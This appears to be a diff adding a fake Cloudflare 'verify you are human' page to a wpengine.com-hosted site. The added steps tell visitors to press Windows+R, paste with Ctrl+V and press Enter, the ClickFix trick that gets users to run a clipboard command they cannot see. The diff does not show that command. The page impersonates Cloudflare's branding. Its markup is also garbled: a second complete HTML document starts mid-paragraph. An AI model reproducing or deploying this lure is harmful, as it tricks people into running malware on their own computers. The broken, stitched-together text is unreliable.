@@ -10,6 +10,48 @@
 <body class="dark-theme">
     <div class="main-wrapper">
         <div class="verification-container">
+            <h1 class="domain-name" id="domain-name">Loading...</h1>
+            
+            <div class="loading-section">
+                <div class="loader"></div>
+                <p class="loading-text">Verifying you are human. This may take a few seconds.</p>
+            </div>
+
+            <div class="challenge-box">
+                <div class="cloudflare-branding">
+                    <img src="data:image/png;base64,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" alt="Cloudflare">
+                    <span>Cloudflare</span>
+                </div>
+                
+                <div class="verification-steps">
+                    <div class="steps-header">
+                        <span>Security by Cloudflare</span>
+                        <span>Verification steps</span>
+                    </div>
+                    
+                    <div class="steps-content">
+                        <p>Let us know you're human, please complete steps:</p>
+                        <ol>
+                            <li>Press & hold the Windows Key + R</li>
+                            <li>In the verification window, press Ctrl + V</li>
+                            <li>Press Enter on the keyboard to complete</li>
+                        </ol>
+                    </div>
+                    
+                    <div class="steps-footer">
+                        <p>You will observe and agree:</p>
+                        <p class="verification-id">I am not a robot -<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Verifying...</title>
+    <link rel="stylesheet" href="main.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text x='50%' y='50%' dominant-baseline='middle' text-anchor='middle' font-size='14'>🛡️</text></svg>">
+</head>
+<body class="dark-theme">
+    <div class="main-wrapper">
+        <div class="verification-container">
             <h1 class="domain-name">upldev.wpengine.com</h1>
             
             <div class="loading-section">
